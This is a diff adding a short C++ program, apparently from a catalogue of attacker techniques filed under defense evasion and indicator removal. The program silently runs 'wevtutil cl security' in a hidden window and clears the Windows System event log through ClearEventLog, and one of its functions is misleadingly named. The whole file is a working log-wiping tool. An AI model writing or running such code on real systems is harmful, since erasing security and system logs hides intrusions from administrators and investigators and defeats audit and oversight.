@@ -1,0 +1,50 @@
+---
+title: ".001.ClearWindowsEventLogs"
+folder: "07. Defense Evasion/T1070 Indicator Removal"
+---
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+void AutorunRegistryBackground4() {
+
+    const char* command = "cmd.exe /c wevtutil cl security";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+void ClearEventLogs() {
+
+    std::wstring logName = L"System";
+
+    HANDLE hEventLog = OpenEventLog(NULL, logName.c_str());
+    if (hEventLog == NULL) {
+        return;
+    }
+    if (!ClearEventLog(hEventLog, NULL)) {
+    }
+
+    CloseEventLog(hEventLog);
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+
+    AutorunRegistryBackground4();
+    ClearEventLogs();
+    return 0;
+}
